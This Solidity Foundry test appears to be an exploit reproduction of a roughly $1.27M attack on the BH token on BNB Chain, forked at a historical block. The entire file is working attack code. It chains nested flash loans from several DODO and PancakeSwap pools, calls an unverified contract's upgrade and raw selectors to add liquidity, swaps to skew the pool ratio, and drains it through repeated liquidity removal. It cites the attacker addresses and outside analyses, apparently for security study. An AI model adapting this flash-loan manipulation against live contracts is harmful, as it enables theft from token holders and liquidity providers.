// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$1.27M
// Attacker : https://bscscan.com/address/0xfdbfceea1de360364084a6f37c9cdb7aaea63464
// Attack Contract : https://bscscan.com/address/0x216ccfd4fb3f2267677598f96ef1ff151576480c
// Vulnerable Contract : https://bscscan.com/address/0xcc61cc9f2632314c9d452aca79104ddf680952b5
// Attack Tx : https://bscscan.com/tx/0xc11e4020c0830bcf84bfa197696d7bfad9ff503166337cb92ea3fade04007662

// @Analysis
// https://twitter.com/BeosinAlert/status/1712139760813375973
// https://twitter.com/DecurityHQ/status/1712118881425203350

interface IUnverifiedContract1 {
    function Upgrade(address _lpToken) external;
}

contract ContractTest is Test {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant BH = IERC20(0xCC61CC9F2632314c9d452acA79104DDf680952b5);
    IDPPOracle private constant DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle private constant DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle private constant DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    Uni_Pair_V2 private constant WBNB_BUSDT = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IUnverifiedContract1 private constant UnverifiedContract1 =
        IUnverifiedContract1(0x8cA7835aa30b025b38A59309DD1479d2F452623a);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant lpToken = 0xdbC27f2e9a2532b15C848F4Ae408cfE8BeB14959;
    address private constant unverifiedContractAddr2 = 0x5b9dd1De70320B1EA6C8BBebA12bf4e246227999;
    address private constant busdt_bh_lp = 0x2371E4Ad771020CE3D8252f1db3e5559FbA8eeb5;

    function setUp() public {
        vm.createSelectFork("bsc", 32_512_073);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(BH), "BH");
        vm.label(address(DPPOracle1), "DPPOracle1");
        vm.label(address(DPPOracle2), "DPPOracle2");
        vm.label(address(DPPOracle3), "DPPOracle3");
        vm.label(address(DPPAdvanced), "DPPAdvanced");
        vm.label(address(DPP), "DPP");
        vm.label(address(WBNB_BUSDT), "WBNB_BUSDT");
        vm.label(address(BUSDT_USDC), "BUSDT_USDC");
        vm.label(address(UnverifiedContract1), "UnverifiedContract1");
        vm.label(address(Router), "Router");
        vm.label(lpToken, "lpToken");
        vm.label(unverifiedContractAddr2, "unverifiedContractAddr2");
        vm.label(busdt_bh_lp, "busdt_bh_lp");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);

        emit log_named_decimal_uint(
            "Attacker BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        emit log_named_decimal_uint("Attacker BH balance before attack", BH.balanceOf(address(this)), BH.decimals());

        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), abi.encode(0));

        emit log_named_decimal_uint(
            "Attacker BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        emit log_named_decimal_uint("Attacker BH balance after attack", BH.balanceOf(address(this)), BH.decimals());
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (abi.decode(data, (uint256)) == uint256(0)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), abi.encode(1));
        } else if (abi.decode(data, (uint256)) == uint256(1)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), abi.encode(2));
        } else if (abi.decode(data, (uint256)) == uint256(2)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), abi.encode(3));
        } else if (abi.decode(data, (uint256)) == uint256(3)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), abi.encode(4));
        } else {
            WBNB_BUSDT.swap(10_000_000 * 1e18, 0, address(this), abi.encode(0));
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        BUSDT_USDC.flash(address(this), 15_000_000 * 1e18, 0, abi.encode(0));
        BUSDT.transfer(address(WBNB_BUSDT), amount0 + 60_000 * 1e18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        BUSDT.approve(address(UnverifiedContract1), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);
        BH.approve(address(UnverifiedContract1), type(uint256).max);

        uint8 i;
        while (i < 12) {
            UnverifiedContract1.Upgrade(lpToken);
            ++i;
        }

        // Adding liquidity.
        (bool success,) =
            address(UnverifiedContract1).call(abi.encodeWithSelector(bytes4(0x33688938), 3_000_000 * 1e18));

        require(success, "Call to function with selector 0x33688938 fail");

        // Swap tokens. Change the liquidity removal ratio in favor of Attacker
        BUSDTToBH();

        // Remove liquidity
        i = 0;
        while (i < 10) {
            uint256 lpAmount = (BH.balanceOf(busdt_bh_lp) * 55) / 100;

            (success,) = address(UnverifiedContract1).call(abi.encodeWithSelector(bytes4(0x4e290832), lpAmount));

            require(success, "Call to function with selector 0x4e290832 fail");
            ++i;
        }

        BUSDT.transfer(address(BUSDT_USDC), 15_000_000 * 1e18 + fee0);
    }

    function BUSDTToBH() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            22_000_000 * 1e18, 0, path, unverifiedContractAddr2, block.timestamp + 100
        );
    }
}
